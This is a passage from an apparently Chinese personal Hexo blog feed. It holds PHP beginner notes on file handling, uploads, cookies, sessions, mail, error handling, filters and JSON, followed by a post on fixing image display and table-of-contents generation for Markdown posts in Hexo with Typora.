生成一个致命错误，在错误发生后脚本会停止执行。</li><li>include 生成一个警告，在错误发生后脚本会继续执行。</li></ul><h2 id="PHP-文件处理"><a class="header-anchor" href="#PHP-文件处理">🍭</a>PHP 文件处理</h2><h4 id="打开文件"><a class="header-anchor" href="#打开文件">🍭</a>打开文件</h4><p>fopen()的第一个参数含有要打开的文件的名称，第二个参数规定了使用哪种模式来打开文件：</p><pre><code class="hljs mel">$file=<span class="hljs-keyword">fopen</span>(<span class="hljs-string">&quot;blackpink.txt&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>);</code></pre><p>关闭文件fclose() 函数，语法与打开相同。</p><h4 id="feof-函数"><a class="header-anchor" href="#feof-函数">🍭</a>feof() 函数</h4><p>检测是否已到达文件末尾（EOF）</p><pre><code class="hljs lisp">if (<span class="hljs-name">feof</span>($file)) echo <span class="hljs-string">&quot;文件结尾&quot;</span><span class="hljs-comment">;</span></code></pre><ul><li><strong>fgets() 函数</strong>用于从文件中逐行读取文件。</li><li><strong>fgetc() 函数</strong>用于从文件中逐字符地读取文件。</li></ul><h2 id="PHP文件上传"><a class="header-anchor" href="#PHP文件上传">🍭</a>PHP文件上传</h2><pre><code class="hljs subunit">test|-----upload             # 文件上传的目录|-----form.html          # 表单文件|-----upload_file.php    # php 上传代码</code></pre><h4 id="创建一个文件上传表单"><a class="header-anchor" href="#创建一个文件上传表单">🍭</a>创建一个文件上传表单</h4><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;utf-8&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>blackpink(blackpink.com)<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;upload_file.php&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post&quot;</span> <span class="hljs-attr">enctype</span>=<span class="hljs-string">&quot;multipart/form-data&quot;</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">&quot;file&quot;</span>&gt;</span>文件名：<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;file&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;提交&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></code></pre><p><strong>enctype</strong> 规定了在提交表单时要使用哪种内容类型,<strong>type=“file”</strong> 属性规定了应该把输入作为文件来处理</p><h4 id="创建上传脚本"><a class="header-anchor" href="#创建上传脚本">🍭</a>创建上传脚本</h4><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">if</span> ($_FILES[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;error&quot;</span>] &gt; <span class="hljs-number">0</span>)&#123;    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;错误：&quot;</span> . $_FILES[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;error&quot;</span>] . <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;&#125;<span class="hljs-keyword">else</span>&#123;    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;上传文件名: &quot;</span> . $_FILES[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;name&quot;</span>] . <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;文件类型: &quot;</span> . $_FILES[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;type&quot;</span>] . <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;文件大小: &quot;</span> . ($_FILES[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;size&quot;</span>] / <span class="hljs-number">1024</span>) . <span class="hljs-string">&quot; kB&lt;br&gt;&quot;</span>;    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;文件临时存储的位置: &quot;</span> . $_FILES[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;tmp_name&quot;</span>];<span class="hljs-comment">//存储在服务器的文件的临时副本的名称</span>&#125;<span class="hljs-meta">?&gt;</span></code></pre><p>用户只能上传 .gif、.jpeg、.jpg、.png 文件，文件大小必须小于 200 kB。文件被上传结束后，默认被存储在了临时目录中，须将它从临时目录中删除或移动到其它地方，脚本执行完后临时目录里的文件肯定会被删除，所以在删除之前要用PHP的 copy() 函数将它复制到其它位置。</p><h2 id="PHP-Cookie"><a class="header-anchor" href="#PHP-Cookie">🍭</a>PHP Cookie</h2><p>常用于识别用户，通过setcookie() 函数（必须位于 <html> 标签之前。）设置 cookie。</html></p><pre><code class="hljs pgsql">setcookie(<span class="hljs-type">name</span>, <span class="hljs-keyword">value</span>, expire, <span class="hljs-type">path</span>, <span class="hljs-keyword">domain</span>);</code></pre><p>$_COOKIE 变量用于取回 cookie 的值，isset() 函数来确认是否已设置了 cookie。</p><p>删除 Cookie：使过期日期变更为过去的时间点。</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-comment">// 设置 cookie 过期时间为过去 0.5小时</span>setcookie(<span class="hljs-string">&quot;user&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, time()<span class="hljs-number">-1800</span>);<span class="hljs-meta">?&gt;</span></code></pre><h2 id="PHP-Session"><a class="header-anchor" href="#PHP-Session">🍭</a>PHP Session</h2><p>为每个访客创建一个唯一的 id (UID)，并基于这个 UID 来存储变量。UID 存储在 cookie 中，或者通过 URL 进行传导。但会话信息是临时的，在用户离开网站后将被删除，故若需要永久存储信息，可以把数据存储在数据库中。</p><p>启动会话：session_start() 函数必须位于 <html> 标签之前。</html></p><p>存储和取回 session 变量：使用 PHP $_SESSION 变量</p><p>删除某些 session 数据：使用 unset() 或 session_destroy() 函数。</p><h2 id="PHP-发送电子邮件"><a class="header-anchor" href="#PHP-发送电子邮件">🍭</a>PHP 发送电子邮件</h2><h4 id="PHP-mail-函数"><a class="header-anchor" href="#PHP-mail-函数">🍭</a>PHP mail() 函数</h4><p>从脚本中发送电子邮件。</p><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">mail</span><span class="hljs-params">(to,subject,message,headers,parameters)</span></span></code></pre><p>实例:</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>$to = <span class="hljs-string">&quot;someone@example.com&quot;</span>;         <span class="hljs-comment">// 邮件接收者</span>$subject = <span class="hljs-string">&quot;参数邮件&quot;</span>;                <span class="hljs-comment">// 邮件标题</span>$message = <span class="hljs-string">&quot;Hello! 这是邮件的内容。&quot;</span>;  <span class="hljs-comment">// 邮件正文</span>$from = <span class="hljs-string">&quot;someonelse@example.com&quot;</span>;   <span class="hljs-comment">// 邮件发送者</span>$headers = <span class="hljs-string">&quot;From:&quot;</span> . $from;         <span class="hljs-comment">// 头部信息设置</span>mail($to,$subject,$message,$headers);<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;邮件已发送&quot;</span>;<span class="hljs-meta">?&gt;</span></code></pre><h4 id="PHP-E-mail-注入"><a class="header-anchor" href="#PHP-E-mail-注入">🍭</a>PHP E-mail 注入</h4><p>常规php e-mail 存在的问题：未经授权的用户可通过输入表单在邮件头部插入数据。为防止 e-mail 注入应对输入进行验证。可使用 PHP 过滤器来对输入进行验证：</p><ul><li>FILTER_SANITIZE_EMAIL 过滤器从字符串中删除电子邮件的非法字符</li><li>FILTER_VALIDATE_EMAIL 过滤器验证电子邮件地址的值</li></ul><h2 id="PHP-错误处理"><a class="header-anchor" href="#PHP-错误处理">🍭</a>PHP 错误处理</h2><h4 id="使用-die-函数"><a class="header-anchor" href="#使用-die-函数">🍭</a>使用 die() 函数</h4><h4 id="创建自定义错误处理器"><a class="header-anchor" href="#创建自定义错误处理器">🍭</a>创建自定义错误处理器</h4><p>创建了一个专用函数，可以在 PHP 中发生错误时调用该函数。该函数必须有能力处理至少两个参数 (error level 和 error message)，最多可以接受五个参数（可选的：file, line-number 和 error context）</p><h4 id="设置错误处理程序"><a class="header-anchor" href="#设置错误处理程序">🍭</a>设置错误处理程序</h4><p>若自定义函数要处理所有错误，set_error_handler() 仅需要一个参数</p><h4 id="触发错误：-trigger-error"><a class="header-anchor" href="#触发错误：-trigger-error">🍭</a>触发错误： trigger_error()</h4><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>$test=<span class="hljs-number">2</span>;<span class="hljs-keyword">if</span> ($test&gt;<span class="hljs-number">1</span>)&#123;    trigger_error(<span class="hljs-string">&quot;变量值必须小于等于 1&quot;</span>);&#125;<span class="hljs-meta">?&gt;</span></code></pre><p>可以在脚本中任何位置触发错误，通过添加的第二个参数，规定所触发的错误类型。</p><ul><li>E_USER_ERROR - 错误无法恢复。脚本执行被中断。</li><li>E_USER_WARNING - 脚本执行不被中断。</li><li>E_USER_NOTICE -在脚本发现可能有错误时发生，但也可能在脚本正常运行时发生。</li></ul><h4 id="错误记录"><a class="header-anchor" href="#错误记录">🍭</a>错误记录</h4><p>根据在 php.ini 中的 error_log 配置，PHP 向服务器的记录系统或文件发送错误记录，通过 error_log() 函数，向指定的文件或远程目的地发送错误记录；可通过电子邮件发送错误消息。</p><h2 id="PHP-异常处理"><a class="header-anchor" href="#PHP-异常处理">🍭</a>PHP 异常处理</h2><h4 id="Try、throw-和-catch"><a class="header-anchor" href="#Try、throw-和-catch">🍭</a>Try、throw 和 catch</h4><ol><li>Try - 使用异常的函数应该位于 “try” 代码块内。如果无触发异常，则代码将照常继续执行。如果异常被触发，会抛出一个异常。</li><li>Throw - 里规定如何触发异常。每一个 “throw” 必须对应至少一个 “catch”。</li><li>Catch - “catch” 代码块会捕获异常，并创建一个包含异常信息的对象。</li></ol><h4 id="创建一个自定义的-Exception-类（继承了-PHP-的-exception-类的所有属性，可向其添加自定义的函数）"><a class="header-anchor" href="#创建一个自定义的-Exception-类（继承了-PHP-的-exception-类的所有属性，可向其添加自定义的函数）">🍭</a>创建一个自定义的 Exception 类（继承了 PHP 的 exception 类的所有属性，可向其添加自定义的函数）</h4><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">customException</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Exception</span></span><span class="hljs-class"></span>&#123;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">errorMessage</span>(<span class="hljs-params"></span>)</span><span class="hljs-function">    </span>&#123;        $errorMsg = <span class="hljs-string">&#x27;错误行号 &#x27;</span>.<span class="hljs-keyword">$this</span>-&gt;getLine().<span class="hljs-string">&#x27; in &#x27;</span>.<span class="hljs-keyword">$this</span>-&gt;getFile()        .<span class="hljs-string">&#x27;: &lt;b&gt;&#x27;</span>.<span class="hljs-keyword">$this</span>-&gt;getMessage().<span class="hljs-string">&#x27;&lt;/b&gt; 不是一个合法的 E-Mail 地址&#x27;</span>;        <span class="hljs-keyword">return</span> $errorMsg;    &#125;&#125; $email = <span class="hljs-string">&quot;someone@example...com&quot;</span>; <span class="hljs-keyword">try</span>&#123;    <span class="hljs-keyword">if</span>(filter_var($email, FILTER_VALIDATE_EMAIL) === <span class="hljs-literal">FALSE</span>)    &#123;        <span class="hljs-comment">// 如果是个不合法的邮箱地址，抛出异常</span>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> customException($email);    &#125;&#125; <span class="hljs-keyword">catch</span> (customException $e)<span class="hljs-comment">//catch&quot; 代码块捕获异常，并显示错误消息。</span>&#123;<span class="hljs-comment">//display custom message</span><span class="hljs-keyword">echo</span> $e-&gt;errorMessage();<span class="hljs-comment">//如果 e-mail 地址不合法，则该函数返回一条错误消息</span>&#125;<span class="hljs-meta">?&gt;</span></code></pre><p>设置顶层异常处理器：set_exception_handler() 函数可设置处理所有未捕获异常的用户定义函数。</p><h2 id="PHP-过滤器"><a class="header-anchor" href="#PHP-过滤器">🍭</a>PHP 过滤器</h2><p>用于验证和过滤来自非安全来源的数据。</p><ul><li>filter_var() - 通过一个指定的过滤器来过滤单一的变量</li><li>filter_var_array() - 通过相同的或不同的过滤器来过滤多个变量</li><li>filter_input - 获取一个输入变量，并对它进行过滤</li><li>filter_input_array - 获取多个输入变量，并通过相同的或不同的过滤器对它们进行过滤</li></ul><p>Validating 过滤器：用于验证用户输入，严格的格式规则（比如 URL 或 E-Mail 验证），如果成功则返回预期的类型，如果失败则返回 FALSE。</p><p>Sanitizing 过滤器：用于允许或禁止字符串中指定的字符，无数据格式规则，始终返回字符串。</p><p>选项和标志用于向指定的过滤器添加额外的过滤选项，不同的过滤器有不同的选项和标志。</p><h4 id="验证输入"><a class="header-anchor" href="#验证输入">🍭</a>验证输入</h4><p>先确认是否存在我们正在查找的输入数据，然后用 filter_input() 函数过滤输入的数据；检测是否存在 输入变量，如果存在输入变量，检测它是否是有效的地址。</p><p>净化输入：filter_input()</p><h4 id="过滤多个输入：filter-var-array-或-the-filter-input-array"><a class="header-anchor" href="#过滤多个输入：filter-var-array-或-the-filter-input-array">🍭</a>过滤多个输入：filter_var_array 或 the filter_input_array</h4><p>filter_input_array() 函数的第二个参数可以是数组或单一过滤器的 ID。</p><p>如果该参数是单一过滤器的 ID，那这个指定的过滤器会过滤输入数组中所有的值。</p><p>如果该参数是一个数组，那么此数组必须遵循下面的规则：</p><ul><li>必须是一个关联数组，其中包含的输入变量是数组的键</li><li>此数组的值必须是过滤器的 ID ，或者是规定了过滤器、标志和选项的数组</li></ul><h4 id="Filter-Callback"><a class="header-anchor" href="#Filter-Callback">🍭</a>Filter Callback</h4><p>调用自定义的函数，将准备用到的过滤器的函数，按指定选项的规定方法进行规定；在关联数组中，带有名称 “options”。</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">convertSpace</span>(<span class="hljs-params">$string</span>)</span><span class="hljs-function"></span>&#123;    <span class="hljs-keyword">return</span> str_replace(<span class="hljs-string">&quot;_&quot;</span>, <span class="hljs-string">&quot;.&quot;</span>, $string);<span class="hljs-comment">//创建一个把 &quot;_&quot; 替换为 &quot;.&quot; 的函数</span>&#125; $string = <span class="hljs-string">&quot;black_pink!&quot;</span>; <span class="hljs-keyword">echo</span> filter_var($string, FILTER_CALLBACK,<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;options&quot;</span>=&gt;<span class="hljs-string">&quot;convertSpace&quot;</span>));<span class="hljs-meta">?&gt;</span></code></pre><p>输出：black.pink!</p><h2 id="PHP-JSON"><a class="header-anchor" href="#PHP-JSON">🍭</a>PHP JSON</h2><h4 id="json-encode：用于对变量进行-JSON-编码"><a class="header-anchor" href="#json-encode：用于对变量进行-JSON-编码">🍭</a>json_encode：用于对变量进行 JSON 编码</h4><pre><code class="hljs autoit"><span class="hljs-built_in">string</span> json_encode ( $value [, $options = <span class="hljs-number">0</span> ] )</code></pre><p>实例：</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>   $arr = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;a&#x27;</span> =&gt; <span class="hljs-number">1</span>, <span class="hljs-string">&#x27;b&#x27;</span> =&gt; <span class="hljs-number">2</span>, <span class="hljs-string">&#x27;c&#x27;</span> =&gt; <span class="hljs-number">3</span>, <span class="hljs-string">&#x27;d&#x27;</span> =&gt; <span class="hljs-number">4</span>, <span class="hljs-string">&#x27;e&#x27;</span> =&gt; <span class="hljs-number">5</span>);   <span class="hljs-keyword">echo</span> json_encode($arr);<span class="hljs-meta">?&gt;</span></code></pre><p>输出：{“a”:1,“b”:2,“c”:3,“d”:4,“e”:5}</p><h4 id="将-PHP-对象转换为-JSON-格式数据"><a class="header-anchor" href="#将-PHP-对象转换为-JSON-格式数据">🍭</a>将 PHP 对象转换为 JSON 格式数据</h4><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>   <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Emp</span> </span>&#123;       <span class="hljs-keyword">public</span> $name = <span class="hljs-string">&quot;&quot;</span>;       <span class="hljs-keyword">public</span> $hobbies  = <span class="hljs-string">&quot;&quot;</span>;       <span class="hljs-keyword">public</span> $birthdate = <span class="hljs-string">&quot;&quot;</span>;   &#125;   $e = <span class="hljs-keyword">new</span> Emp();   $e-&gt;name = <span class="hljs-string">&quot;yuting&quot;</span>;   $e-&gt;hobbies  = <span class="hljs-string">&quot;travel&quot;</span>;   $e-&gt;birthdate = date(<span class="hljs-string">&#x27;m/d/Y h:i:s a&#x27;</span>, <span class="hljs-string">&quot;9/16/2002 8:30:03 a&quot;</span>);   $e-&gt;birthdate = date(<span class="hljs-string">&#x27;m/d/Y h:i:s a&#x27;</span>, strtotime(<span class="hljs-string">&quot;9/16/2002 8:30:03&quot;</span>));   <span class="hljs-keyword">echo</span> json_encode($e);<span class="hljs-meta">?&gt;</span></code></pre><p>输出：{“name”:“yuting”,“hobbies”:“travel”,“birthdate”:“09/16/2002 8:30:03 am”}</p><h4 id="json-decode"><a class="header-anchor" href="#json-decode">🍭</a>json_decode</h4><p>用于对 JSON 格式的字符串进行解码，并转换为 PHP 变量。</p><pre><code class="hljs nginx"><span class="hljs-attribute">mixed</span> json_decode (<span class="hljs-variable">$json_string</span> [,<span class="hljs-variable">$assoc</span> = <span class="hljs-literal">false</span> [, <span class="hljs-variable">$depth</span> = <span class="hljs-number">512</span> [, <span class="hljs-variable">$options</span> = <span class="hljs-number">0</span> ]]])</code></pre><ul><li><strong>json_string</strong>: 待解码的 JSON 字符串，必须是 UTF-8 编码数据</li><li><strong>assoc</strong>: 当该参数为 TRUE 时，将返回数组，FALSE 时返回对象。</li><li><strong>depth</strong>: 整数类型的参数，它指定递归深度</li><li><strong>options</strong>: 二进制掩码，目前只支持 JSON_BIGINT_AS_STRING 。</li></ul>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Markdown上传博客文章的图片显示及目录生成问题</title>
    <link href="/2020/10/27/problem/"/>
    <url>/2020/10/27/problem/</url>
    
    <content type="html"><![CDATA[<ul><li><a href="#%E5%9B%BE%E7%89%87">图片</a><ul><li><a href="#%E6%B3%95%E4%B8%80">法一：</a><ul><li><a href="#%E4%B8%80%E8%A3%85%E6%8F%92%E4%BB%B6">一、装插件</a></li><li><a href="#%E4%BA%8C%E6%94%B9%E8%AE%BE%E7%BD%AE">二、改设置</a><ul><li><a href="#1typora%E7%9A%84%E5%9B%BE%E7%89%87%E6%A0%B9%E7%9B%AE%E5%BD%95%E8%AE%BE%E7%BD%AE">1、Typora的图片根目录设置</a></li><li><a href="#2typora%E8%AE%BE%E7%BD%AE%E5%9B%BE%E7%89%87%E7%9A%84%E7%9B%B8%E5%AF%B9%E8%B7%AF%E5%BE%84">2、Typora设置图片的相对路径</a></li><li><a href="#3typora%E8%87%AA%E5%8A%A8%E5%A4%8D%E5%88%B6%E5%9B%BE%E7%89%87%E5%88%B0%E6%8C%87%E5%AE%9A%E7%9B%AE%E5%BD%95%E4%B8%8B">3、Typora自动复制图片到指定目录下</a></li></ul></li></ul></li><li><a href="#%E6%B3%95%E4%BA%8C%E9%80%82%E7%94%A8%E4%BA%8Emac">法二：(适用于mac)</a></li></ul></li><li><a href="#%E7%9B%AE%E5%BD%95">目录</a></li><li><a href="#%E5%B0%BE%E8%AE%B0">尾记</a></li></ul><p>刚发表第一篇博客文章时，发现在typora里写的带有图片及目录的文章更到博客里图片与目录就无法显示；为此找了许多方法，总结如下：</p><p>原因:由于上传的图片使用的是绝对路径或者相对路径，每次插入截图的图片时，默认都是将图片存在C盘中，当MD文件移动时，图片的链接就会失效，就会出现图片加载失败的问题。</p><h2 id="图片"><a class="header-anchor" href="#图片">🍭</a>图片</h2><h3 id="法一："><a class="header-anchor" href="#法一：">🍭</a>法一：</h3><h4 id="一、装插件"><a class="header-anchor" href="#一、装插件">🍭</a>一、装插件</h4><p>我们需要安装一个图片路径转换的插件：</p><pre><code class="hljs awk">npm install https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/CodeFalling/</span>hexo-asset-image --save</code></pre><p>插件的内容需要修改:</p><p>打开/node_modules/hexo-asset-image/index.js，将内容更换为下面的代码。</p><pre><code class="hljs javascript"><span class="hljs-meta">&#x27;use strict&#x27;</span>;<span class="hljs-keyword">var</span> cheerio = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;cheerio&#x27;</span>);<span class="hljs-comment">// http://stackoverflow.com/questions/14480345/how-to-get-the-nth-occurrence-in-a-string</span><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getPosition</span>(<span class="hljs-params">str, m, i</span>) </span>&#123;  <span class="hljs-keyword">return</span> str.split(m, i).join(m).length;&#125;<span class="hljs-keyword">var</span> version = <span class="hljs-built_in">String</span>(hexo.version).split(<span class="hljs-string">&#x27;.&#x27;</span>);hexo.extend.filter.register(<span class="hljs-string">&#x27;after_post_render&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">data</span>)</span>&#123;  <span class="hljs-keyword">var</span> config = hexo.config;  <span class="hljs-keyword">if</span>(config.post_asset_folder)&#123;    <span class="hljs-keyword">var</span> link = data.permalink;<span class="hljs-keyword">if</span>(version.length &gt; <span class="hljs-number">0</span> &amp;&amp; <span class="hljs-built_in">Number</span>(version[<span class="hljs-number">0</span>]) == <span class="hljs-number">3</span>)   <span class="hljs-keyword">var</span> beginPos = getPosition(link, <span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-number">1</span>) + <span class="hljs-number">1</span>;<span class="hljs-keyword">else</span>   <span class="hljs-keyword">var</span> beginPos = getPosition(link, <span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-number">3</span>) + <span class="hljs-number">1</span>;<span class="hljs-comment">// In hexo 3.1.1, the permalink of &quot;about&quot; page is like &quot;.../about/index.html&quot;.</span><span class="hljs-keyword">var</span> endPos = link.lastIndexOf(<span class="hljs-string">&#x27;/&#x27;</span>) + <span class="hljs-number">1</span>;    link = link.substring(beginPos, endPos);    <span class="hljs-keyword">var</span> toprocess = [<span class="hljs-string">&#x27;excerpt&#x27;</span>, <span class="hljs-string">&#x27;more&#x27;</span>, <span class="hljs-string">&#x27;content&#x27;</span>];    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; toprocess.length; i++)&#123;      <span class="hljs-keyword">var</span> key = toprocess[i];       <span class="hljs-keyword">var</span> $ = cheerio.load(data[key], &#123;        ignoreWhitespace: <span class="hljs-literal">false</span>,        xmlMode: <span class="hljs-literal">false</span>,        lowerCaseTags: <span class="hljs-literal">false</span>,        decodeEntities: <span class="hljs-literal">false</span>      &#125;);      $(<span class="hljs-string">&#x27;img&#x27;</span>).each(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>&#123;<span class="hljs-keyword">if</span> ($(<span class="hljs-built_in">this</span>).attr(<span class="hljs-string">&#x27;src&#x27;</span>))&#123;<span class="hljs-comment">// For windows style path, we replace &#x27;\&#x27; to &#x27;/&#x27;.</span><span class="hljs-keyword">var</span> src = $(<span class="hljs-built_in">this</span>).attr(<span class="hljs-string">&#x27;src&#x27;</span>).replace(<span class="hljs-string">&#x27;\\&#x27;</span>, <span class="hljs-string">&#x27;/&#x27;</span>);<span class="hljs-keyword">if</span>(!<span class="hljs-regexp">/http[s]*.*|\/\/.*/</span>.test(src) &amp;&amp;   !<span class="hljs-regexp">/^\s*\//</span>.test(src)) &#123;  <span class="hljs-comment">// For &quot;about&quot; page, the first part of &quot;src&quot; can&#x27;t be removed.</span>  <span class="hljs-comment">// In addition, to support multi-level local directory.</span>  <span class="hljs-keyword">var</span> linkArray = link.split(<span class="hljs-string">&#x27;/&#x27;</span>).filter(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">elem</span>)</span>&#123;<span class="hljs-keyword">return</span> elem != <span class="hljs-string">&#x27;&#x27;</span>;  &#125;);  <span class="hljs-keyword">var</span> srcArray = src.split(<span class="hljs-string">&#x27;/&#x27;</span>).filter(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">elem</span>)</span>&#123;<span class="hljs-keyword">return</span> elem != <span class="hljs-string">&#x27;&#x27;</span> &amp;&amp; elem != <span class="hljs-string">&#x27;.&#x27;</span>;  &#125;);  <span class="hljs-keyword">if</span>(srcArray.length &gt; <span class="hljs-number">1</span>)srcArray.shift();  src = srcArray.join(<span class="hljs-string">&#x27;/&#x27;</span>);  $(<span class="hljs-built_in">this</span>).attr(<span class="hljs-string">&#x27;src&#x27;</span>, config.root + link + src);  <span class="hljs-built_in">console</span>.info&amp;&amp;<span class="hljs-built_in">console</span>.info(<span class="hljs-string">&quot;update link as:--&gt;&quot;</span>+config.root + link + src);&#125;&#125;<span class="hljs-keyword">else</span>&#123;<span class="hljs-built_in">console</span>.info&amp;&amp;<span class="hljs-built_in">console</span>.info(<span class="hljs-string">&quot;no src attr, skipped...&quot;</span>);<span class="hljs-built_in">console</span>.info&amp;&amp;<span class="hljs-built_in">console</span>.info($(<span class="hljs-built_in">this</span>));&#125;      &#125;);      data[key] = $.html();    &#125;  &#125;&#125;);</code></pre><p>操作完成后，每次用hexo  new XXX 创建新文章时列表会多出一个与文章同名的文件夹：</p><p><img src="/2020/10/27/problem/1.jpg" alt="1"></p><p>接下来打开_config.yml文件，修改下述内容，将false改成true。</p><pre><code class="hljs yaml"><span class="hljs-attr">post_asset_folder:</span> <span class="hljs-literal">true</span></code></pre><p>将文章需要用到的图片存入同名文件夹中，但仅仅这样还是无法显示图片。</p><h4 id="二、改设置"><a class="header-anchor" href="#二、改设置">🍭</a>二、改设置</h4><h5 id="1、Typora的图片根目录设置"><a class="header-anchor" href="#1、Typora的图片根目录设置">🍭</a>1、Typora的图片根目录设置</h5><p>点击 文件—偏好设置—图像</p><p>默认是“无特殊操作”,更改为“复制图片到./${filename}.assets文件夹”</p><h5 id="2、Typora设置图片的相对路径"><a class="header-anchor" href="#2、Typora设置图片的相对路径">🍭</a>2、Typora设置图片的相对路径</h5><p>勾选下面两项“对本地位置的图片应用上述规则”和“优先使用相对路径”。</p><p><img src="/2020/10/27/problem/2.jpg" alt="2"></p><p>更改设置后每次在新建一个md文件时，在md文档所在文件夹中就会自动创建一个与该文件同名的.assets的文件夹，复制的图片也会自动保存到其中。</p><p><img src="/2020/10/27/problem/3.jpg" alt="3"></p><h5 id="3、Typora自动复制图片到指定目录下"><a class="header-anchor" href="#3、Typora自动复制图片到指定目录下">🍭</a>3、Typora自动复制图片到指定目录下</h5><p><img src="/2020/10/27/problem/4.jpg" alt="4"></p><p>之后的图片路径会变成类似如下:</p><pre><code class="hljs markdown">![<span class="hljs-string">黑客</span>](<span class="hljs-link">Cyber.assets/黑客.jpg</span>)</code></pre><h3 id="法二：-适用于mac"><a class="header-anchor" href="#法二：-适用于mac">🍭</a>法二：(适用于mac)</h3><ol><li>与法一类似，在改设置的步骤一时多勾上第四条：允许根据YML设置自动上床图片。</li><li>需再安装图床应用 iPic。</li><li>在改设置的第三步骤时勾选如下:</li></ol><p><img src="/2020/10/27/problem/5.jpg" alt="5"></p><h2 id="目录"><a class="header-anchor" href="#目录">🍭</a>目录</h2><p>markdown可以使用<code>[TOC]</code>来自动生成markdown文件的标题目录，但是github却不支持<code>[TOC]</code>标签。以下针对vscode，安装了Markdown All in One插件。下载地址：<a href="https://www.vsixhub.com/vsix/1925/%E3%80%82%E7%84%B6%E5%90%8E%E5%AF%B9%E4%BA%8E%E4%BD%A0%E8%A6%81%E7%94%9F%E6%88%90%E7%9B%AE%E5%BD%95%E7%9A%84md%E6%96%87%E4%BB%B6%EF%BC%8Cvscode%E5%BF%AB%E6%8D%B7%E9%94%AE">https://www.vsixhub.com/vsix/1925/。然后对于你要生成目录的md文件，vscode快捷键</a> ctrl + shift + p 打开如下</p><p><img src="/2020/10/27/problem/6.jpg" alt="6"></p><p>选择<code> create table of contents</code> 回车即可生成目录。</p><h2 id="尾记"><a class="header-anchor" href="#尾记">🍭</a>尾记</h2><p>最开始图片显示不了的时候特别难受，尤其第一篇文章Markdown中图片很多；当时上百度知乎之类的没有找到解决方案（有的就只有一半，有的根本不行 ),后来搁置了，靶场的环境建完后，又绕回来纠结这个问题，终于找到正解了，平平无奇小天才~~~</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>python(一)</title>
